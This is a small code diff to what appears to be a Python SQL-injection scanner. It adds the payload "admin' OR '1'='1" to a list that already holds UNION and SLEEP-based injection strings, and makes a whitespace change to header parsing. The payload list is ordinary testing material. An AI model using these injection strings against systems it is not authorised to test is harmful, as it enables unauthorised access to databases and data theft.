@@ -23,6 +23,8 @@ sql_payloads = [
     # New payloads
     r"' UNION SELECT table_name, NULL, NULL FROM information_schema.tables WHERE table_schema=DATABASE() --",
     r"' OR IF(1=1, SLEEP(5), 0) --",
+    # Added payload
+    r"admin' OR '1'='1",  # New payload for SQL injection
 ]
 
 # Common SQL error messages for detection
@@ -142,7 +144,7 @@ def main():
     headers = None
     if len(sys.argv) > 3 and sys.argv[3] == '--headers':
         try:
-            headers = {k.strip(): v.strip() for k, v in [h.split(":") for h in sys.argv[4].split(",")]}
+            headers = {k.strip(): v.strip() for k, v in [h.split(":") for h in sys.argv[4].split(",")] }
         except ValueError:
             print("Error: Invalid headers format. Use '--headers \"Header1: Value1, Header2: Value2\"'")
             sys.exit(1)
